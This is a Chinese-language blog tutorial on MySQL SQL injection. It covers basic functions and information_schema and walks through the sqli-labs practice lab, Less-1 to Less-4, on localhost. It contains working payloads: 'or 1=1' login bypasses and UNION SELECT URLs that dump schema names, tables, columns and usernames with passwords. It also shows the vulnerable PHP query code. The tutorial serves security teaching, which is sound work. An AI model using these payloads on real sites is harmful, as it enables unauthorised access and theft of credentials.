---
title: sqli-lab之第一章 基础知识
mathjax: true
date: 2019-05-22 22:15:04
tags: 
- sqli-lab环境搭建
categories: 
- 渗透测试
- sqli-lab
---
## 声明
本文内容参考了lcamry的mysql注入天书: http://www.cnblogs.com/lcamry/category/846064.html

> 在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用`拼接`的方式形成一条完整的数据库语言，而危险的是，在拼接 sql 语句的 时候，我们可以**改变 sql 语句。从而让数据执行我们想要执行的语句，这就是我们常说的 `sql 注入`**。

> 本章将介绍一些 mysql 注入的一些基础知识, 可能知识有点多, 希望大家认真看一遍, 实操一遍.

## 学习篇
### 0x01 注入的分类
> 下面这个是阿德玛表哥的总结的，现在理解不了可以跳过

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190523110728.png)

### 0x02 系统函数
> 这里介绍几个常用函数, 自己实操的话, 可以直接点击Kitematic的`EXEC`运行一个终端, 然后使用`mysql -uroot`进入mysql

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221135.png)

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220924.png)

1. `version()`——MySQL 版本

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220935.png)

2. `user()`——数据库用户名

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220946.png)

3. `database()`——数据库名

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220956.png)

4. `@@datadir`——数据库路径

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221008.png)

5. `@@version_compile_os`——操作系统版本

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221018.png)


### 0x03 字符串连接函数

在select数据时, 我们往往需要将数据进行连接后进行回显. 很多的时候想将多个数据或者多行数据进行输出的时候, 需要使用字符串连接函数. 而在mysql中，常见的字符串连接函函数有`concat()`, `group_concat()`, `concat_ws()`.

举个例子, 不使用字符串连接函数时

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221028.png)

但是这里存在的一个问题是, 当使用union联合注入时, 我们都知道, 联合注入要求前后两个选择的列数要相同, 这里`id`, `username`是两个列, 当我们要一个列的时候, (即回显位只有一个)该怎么办? 这时候就需要用到字符串连接函数了

#### concat()
语法如下:

```
concat(str1,str2,...)
--没有分隔符地连接字符串
--返回结果为连接参数产生的字符串
--如有任何一个参数为NULL, 则返回值为 NULL
--可以有一个或多个参数
```

一般的我们都要用一个字符(这里是逗号)将各个项隔开, 便于数据的查看. 见下图:

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221039.png)

下图是参数中有`NULL`的情况

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221048.png)

#### concat_ws()
语法如下:

```
concat_ws(separator,str1,str2,...)
--含有分隔符地连接字符串, 分隔符的位置会放在要连接的两个字符串之间
--Separator为字符之间的分隔符, 可以是一个字符串, 也可以是其它参数
--如果分隔符为 NULL, 则结果为 NULL
--函数会忽略任何分隔符参数后的 NULL 值
```

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221058.png)

下图是忽略`NULL`的情况

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221110.png)

#### group_concat()
语法如下:

```
group_concat(str1,str2,...)
--连接一个组的所有字符串，并以`逗号`分隔每一条数据.
```

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221123.png)


### 0x04 一般用于尝试的语句
ps:`--+`可以用`#`替换，url 提交过程中 Url 编码后的`#`为`%23` 

```
or 1=1--+
'or 1=1--+
"or 1=1--+
)or 1=1--+
')or 1=1--+
") or 1=1--+
"))or 1=1--+
```

**一般的代码为**：

```php
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

此处考虑两个点

1. 一个是用一个单引号闭合前面的 `'`
2. 另一个是处理后面的`'`, 一般采用两种思路, **闭合后面的引号或者注释掉**，注释掉采用`--+` 或者 `#(%23)`


### 0x05 union 操作符的介绍
**`UNION` 操作符用于合并两个或多个 SELECT 语句的结果集**。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。

#### `SQL  UNION`  语法
```sql
SELECT column_name(s) FROM table_name1 UNION
SELECT column_name(s) FROM table_name2
```

ps：默认地，**UNION 操作符选取不同的值**。如果**允许重复的值，请使用 `UNION ALL`**。

#### `SQL  UNION  ALL`  语法
```sql
SELECT column_name(s) FROM table_name1 UNION ALL
SELECT column_name(s) FROM table_name2
```

另外，`UNION` 结果集中的列名总是等于 `UNION` 中第一个` SELECT `语句中的列名。

### 0x06 sql 中的逻辑运算
> 这里讨论一下逻辑运算的问题

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220749.png)

有一个问题 `elect * from users where id=1 and 1=1;` 这条语句为什么能够选择出` id=1` 的内容, `and 1=1` 到底起作用了没有? 这里就**要清楚 sql 语句执行顺序**了.

同时这个问题我们在使用`万能密码`的时候会用到

```sql
Select * from admin where username='admin' and password='admin'
```

我们可以用   `'or 1=1#`  作为密码输入. 原因是为什么？

这里涉及到一个逻辑运算, 当使用上述所谓的万能密码后, 构成的 sql 语句为：

```sql
Select * from admin where username='admin' and password=''or 1=1#'
```

**Explain**:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句  `username='admin' and password=''or 1=1`。三个条件用 `and` 和` or` 进行连接。在 sql 中，我们 **`and` 的运算优先级大于 `or` 的运算优先级**。因此可以看到 第一个条件（用 `a` 表示）是真的，第二个条件（用`b` 表示）是假的，`a and  b = false`, 第一个条件和第二个条件执行 and 后是假，再与第三个条件 or 运算，因为第三个条件 `1=1` 是恒成立的，所以**结果自然就为真**了。因此上述的语句就是恒真了。

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.0b6a1385urs_1534071271.png)

```
(1) select * from users where id=1 and 1=1;
(2) select * from users where id=1 && 1=1;
(3) select * from users where id=1 & 1 =1;
```

上述三者有什么区别？

* (1)和(2)是一样的，表达的意思是` id=1` 条件和 `1=1` 条件进行`与运算`。
* (3)的意思是 `id=1` 条件与 `1` 进行`&位操作`，`id=1` 被当作 `true`，与` 1` 进行 `& 运算` 结果还是 1， 再进行`=操作`，`1=1`,还是 1（ps：**`&`的优先级大于`=`**）

> Ps:此处进行的`位运算`。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与
1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从ascii 值反推回字符。（运用较少）

### 0x07 information.schema数据库
* 现在做一些 mysql 的基本操作。启动 mysql，然后通过**查询检查下数据库**:

    ```
    mysql -uroot
    show databases;
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127215740.png)

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127215844.png)

* 选择数据库

    ```
    use 数据库名;
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220804.png)

* 查看数据库中有哪些表

    ```
    show tables;
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220815.png)

* 查看指定表的结构

    ```
    desc 表名;
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220827.png)

* 接下来讨论下**系统数据库**，即` information_schema`。
* 首先说一下mysql的数据库`information_schema`，他是`系统数据库`，安装完就有，**记录是当前数据库的数据库，表，列，用户权限**等信息，下面说一下常用的几个表
    * `SCHEMATA`表:储存mysql**所有数据库的基本信息**，包括数据库名，编码类型路径等，`show databases`的结果取之此表。
    * `TABLES`表:储存mysql中的**表信息**，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。`show tables from schemaname`的结果取之此表
    * `COLUMNS`表：提供了**表中的列信息**，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是`show columns from schemaname.tablename`的结果取之此表。

```
use information_schema;
```

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220837.png)

* 让我们来查看下表

    ```
    show tables;
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220857.png)

* 让我们来枚举这张表

    ```
    desc tables;
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127220140.png)

* 现在用下面的指令查询,一般手工注入使用这个查询，我们可以下载到表名。

    ```
    select  table_name  from    information_schema.tables   where   table_schema    =   "security";
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220911.png)


### 0x08 注入流程

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.t0hdn0hc41_1534071286.png)

* 我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是**先拿到`数据库名`，在获取到当前数据库名下的`数据表`，再获取当前数据表下的`列`，最后获取`数据`**。

* sql 有一个系统数据库`information_schema`**存储着所有的数据库的相关信息**，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。

    ```
    猜数据库
    select schema_name from information_schema.schemata 
    猜某库的数据表
    select table_name from information_schema.tables where table_schema=’xxxxx’
    猜某表的所有列
    Select column_name from information_schema.columns where table_name=’xxxxx’
    获取某列的内容
    Select *** from ****
    ```

## 实战篇

### Less1
> 为了方便学习查看，可以在源码中的`$sql`下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的）

![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.3qo9vp3r8h6_1534071351.png)

```php
echo "你的 sql 语句是：".$sql."<br>";  
```

* 在`http://localhost/sqli-labs/Less-1/?id=1`后面直接加上一个`'`,看下效果:

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.cttq5aa2fpp_1534071365.png)

* 从上述错误当中，我们可以看到提交到 sql 中的 `'`在经过 sql 语句构造后形成   `'1'' LIMIT 0,1`， 多加了一个`’`,单引号都不匹配,这样拿去查询肯定报错啊 。这种方式就是**从错误信息中得到我们所需要的信息**，那我们接下来想如何将多余的 `'` 去掉呢？

    > `limit`： 第一个参数是结果集中的第几个，跟C语言的数组的索引(**从0开始**)一致,
    > 第二个参数就是个数 
    > 如 `limit  1,2`  :返回第二行和第三行，因为**1表示是第二行，2表示行数个数是2**

* 先尝试`'or 1=1#`,`#`会将其后面的`'`注释掉

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.qnnfatt1h5_1534071374.png)

    出了点问题，原来浏览器没帮我把`#`**url编码**,可以将`#`换成`%23`,也可换成`--+`注释,`+`浏览器会编码成`空格`

    > 常用url编码:空格是%20，单引号是%27， 井号是%23，双引号是%22

* 尝试`'or 1=1--+`,`--+`会将其后面的`'`注释掉. 此时构造的 sql 语句就成了

    ```
    SELECT * FROM users WHERE id='1'or 1=1--+' LIMIT 0,1
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.hh6v5xu38xh_1534071382.png)

* 可以看到正常返回数据。
* **接下里就是利用 `order by`猜字段**。`Order by` :**对前面的数据进行排序**，**由phpMyadmin可以知道,这里有三列数据**，我们就只能用`order by 3`,超过 3 就会报错。`‘order by 4--+`的结果显示结果超出。其实**1表示第一个栏位,2表示第二栏位; 依此类推**

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.5ehddneepuu_1534071388.png)

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.p0r5eogj11_1534071395.png)

* 最后从源代码中分析下为什么会造成注入？Sql 语句为`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"`; `id 参数`在拼接 sql 语句时，未对 id 进行任何的过滤等操作，所以当提交` 'or 1=1--+`，直接构造的 sql 语句就是

    ```
    SELECT * FROM users WHERE id=’1’or 1=1-- ‘ LIMIT 0,1
    ```

    这条语句因 `or 1=1` 所以为**永恒真**。

* 此外，此处介绍` union 联合注入`，**union 的作用是将两个 sql 语句进行联合**。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个 sql 语句的选择**列数要相同**才可以。Union all 与 union 的区别是增加了**去重**的功能。我们这里根据上述 background 的知识，进行`information_schema` 知识的应用。

    ```
    http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2--+
    ```

    出现下图情况,说明两个sql语句列数不同

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.e8isiwe11qm_1534071400.png)

    ```
    http://127.0.0.1/sqli-labs/Less-1/?id=-1’union select 1,2,3--+
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ge16dj62niu_1534071408.png)

* **当 id 的数据在数据库中不存在时**，（此时我们可以 让`id=-1`, 也可以让`id=1 and 1=2`, 两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，就会将后面的语句的内容显示出来,否则会显示存在id的内容）此处前台页面返回了我们构造的 `union` 的数据。
* 下面顺便看看id存在时的情况,所以要记住,记得要将id设置成一个不存在的值

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127222530.png)

* 下面就真正查询数据库的各种信息了（可以看到**只有第2列和第3列的结果显示在网页上**），所以我们就**只能用`2和3`这两个位置了**，但是两个位置应该是不够用的，这时我们就用到数据库的`连接函数`了，常用的就`concat`和`concat_ws`,其中`concat_ws`的第一个参数是连接字符串的`分隔符`，还会用到`group_concat`(可以把查询出来的多行连接起来)
* 简单复习怎么使用

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.n5l038hrrms_1534071415.png)

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.wox6raufzu_1534071426.png)

    > 再次强调`concat_ws`的一个参数是连接字符串的分隔符，这里很明显可以看到，但一般第一个参数一般都不是这样传过去的，因为会被html编码，要使用mysql的`char函数`将**十进制**ASCII码转化成字符，如下面的（`：`的十进制ASCII是`58`），当然这里的分隔符也可以多个字符

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ifxxgq4eoi_1534071435.png)

    用的较多的就是这个啦，以后直接复制（`32`是`空格`的`十进制ASCII`）

    ```
    concat_ws(char(32,58,32),user(),database(),version())  

    * user():返回当前数据库连接使用的用户
    * database():返回当前数据库连接使用的数据库
    * version():返回当前数据库的版本
    ```

* **爆数据库**

    ```
    http://localhost/sqli-labs/Less-1/?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+
    ```

    此时的 sql 语句为 `SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema
    _name),3 from information_schema.schemata--+ LIMIT 0,1`

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.z30b5fzkoib_1534071444.png)

* 暴`security`数据库的数据表

    ```
    http://localhost/sqli-labs/Less-1/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
    ```

    此时的 sql 语句为 `SELECT * FROM users WHERE id=’-1’union select 1,group_concat(table_n
    ame),3 from information_schema.tables where table_schema=’security’--+ LIMIT 0,1`

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.92t4b6c0djb_1534071453.png)

* 爆 users 表的列

    ```
    http://localhost/sqli-labs/Less-1/?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
    ```
    此时的 sql 语句为 `SELECT * FROM users WHERE id=’-1’union select 1,group_concat(column
    _name),3 from information_schema.columns where table_name=’users’--+ LIMIT 0,1`

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.uxni56mjox_1534071459.png)

* 爆数据

    > 最后那个id=2可以改成3,4,5... ...

    ```
    http://localhost/sqli-labs/Less-1/?id=-1'union select 1,username,password from users where id=2--+
    ```

    此时的 sql 语句为 `SELECT * FROM users WHERE id=’-1’union select 1,username,password f
    rom users where id=2--+ LIMIT 0,1`

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dxjasy45coi_1534071465.png)

    > Less1-less4 都可以利用上述 `union 操作`进行注入。下面就不进行赘述了。

### Less2
* 将`'`（单引号）添加到数字中。

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.siv9brk0hg_1534071471.png)

* 我们又得到了一个 Mysql 返回的错误，提示我们语法错误。
* 现在执行的查询语句如下:

    ```
    SELECT * FROM users WHERE id=1' LIMIT 0,1
    ```

    所以这里的**奇数个单引号**破坏了查询，导致抛出错误。因此我们得出的结果是，**查询代码使用了整数。**

    ```
    Select * from TABLE where id = (some integer value);
    ```

* 现在，从开发者的视角来看，为了对这样的错误采取保护措施，我们可以**注释掉剩余的查询,看是否正确响应**

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.buo6091mrs_1534071478.png)

* 因此，源代码中可以分析到 SQL 语句为下：

    ```
    $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
    ```

* 可以成功注入的有：

    ```
    or 1=1
    or 1=1 --+
    ```

* 其余的 payload 与 less1 中一样，只需要将 less1 中的`‘` 去掉即可。

### Less-3
* 首先加个单引号

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.t2zwn6n8u9_1534071484.png)

* 可以看到报错那里出来了一个），原来这就是单引号注入的变形，那么我们在没有最终的sql语句的情况下怎么判断呢

    首先看到near和at之间的字符串![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dx803xz4yl_1534071497.png)，直接将左右的单引号去掉，那么就得到`'1'') LIMIT 0,1 `

    我们明显看到`1`的右边多了一个`'`这是似成相识的感觉吧，后面还有个`)`，那么对应于左边也应该有`(`，这里它意味着，开发者使用的查询是

    ```
    SELECT * FROM users WHERE id=('our input here') LIMIT 0,1
    ```

* 所以我们再用这样的代码来进行注入：

    ```
    ?id=1')--+
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.4mpstb7m95g_1534071508.png)

    这样一来，我们便可以正常显示用户名和密码了，同时后面查询也已经被注释掉了。

* 在源代码中的 SQL 查询语句

    ```
    $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
    ```

* 可以成功注入的有：

    ```
    ') or '1'=('1    这里的意思是,不使用注释符号
    ') or 1=1--+     这里使用了注释符号
    ```

* 其余的paylodad和less-1中的一样,只需要将less-1中的`'`更换为`')`即可

### Less-4
* 我们使用`?id=1"`,如下图

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/截图_1538842923)

* 注入代码后，我们得到像这样的一个错误

    ```
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
    ```

* 这里它意味着，代码当中对 id 参数进行了`""` 和 `()` 的包装。 所以我们再用这样的代码来进行注入:

    ```
    ?id=1")--+
    ```

    ![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/截图_1538843121)


* 这样一来，我们便可以得到用户名和密码了，同时后面查询也已经被注释掉了。 在源代码中的 SQL 查询语句，31 行

    ```SQL
    $sql="SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1";
    ```

* 可以成功注入的有:

    ```
    ") or "1"=("1
    ") or 1=1--+
    ```

* 其余的 payload 与 less1 中一样，只需要将 less1 中的`'`更换为`")`


